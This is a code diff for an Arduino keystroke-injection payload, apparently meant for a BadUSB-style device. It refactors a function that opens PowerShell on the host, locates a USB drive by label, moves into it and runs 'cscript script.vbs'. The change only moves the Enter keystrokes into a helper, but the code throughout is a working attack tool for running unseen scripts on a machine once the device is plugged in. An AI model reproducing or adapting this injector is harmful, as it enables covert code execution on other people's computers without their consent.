@@ -22,25 +22,24 @@ void payload(){
   Keyboard.releaseAll();
   delay(100);
   Keyboard.print("powershell");
-  Keyboard.write(0x0D);
-  Keyboard.write(0x0A);
+  pressEnter();
   delay(1500);    // wait for powershell to launch. If it doesn't launch in time, the next keystrokes will be useless
   Keyboard.print("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'NAME' } | select name"); // change NAME to your flash name
-  Keyboard.write(0x0D);
-  Keyboard.write(0x0A);
-  delay(100);
+  pressEnter();
   Keyboard.print("cd $usbPath.name");
-  Keyboard.write(0x0D);
-  Keyboard.write(0x0A);
-  delay(100);
+  pressEnter();
   Keyboard.print("clear");
-  Keyboard.write(0x0D);
-  Keyboard.write(0x0A);
-  delay(100);
+  pressEnter();
   Keyboard.print("cscript script.vbs");
-  Keyboard.write(0x0D);
-  Keyboard.write(0x0A);
+  pressEnter();
   delay(1000);
   
+  
+}
+
+void pressEnter(){
+  Keyboard.write(0x0D);
+  Keyboard.write(0x0A);
+  delay(100);
   
 }
